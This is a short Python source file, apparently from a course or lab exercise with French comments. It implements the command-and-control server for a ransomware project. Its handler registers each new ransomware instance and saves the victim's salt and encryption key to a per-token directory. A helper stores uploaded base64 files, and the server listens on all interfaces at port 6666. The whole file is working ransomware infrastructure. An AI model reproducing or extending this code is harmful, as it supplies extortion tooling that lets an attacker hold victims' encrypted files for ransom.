import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        token = sha256(base64.b64decode(body["token"])).hexdigest()
        # Décodage des données 
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])
        # créer un répertoire correspondant au token du secret
        secret_dir = os.path.join(CNC.ROOT_PATH, token)
        os.makedirs(secret_dir, exist_ok=True)
        # enregistrer le sel et la clé dans le répertoire
        with open(os.path.join(secret_dir, "salt.bin"), "wb") as f:
            f.write(salt)
        with open(os.path.join(secret_dir, "key.bin"), "wb") as f:
            f.write(key)
        # retourner une réponse OK au CNC
        return {"status": "OK"}
        #return {"status":"KO"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()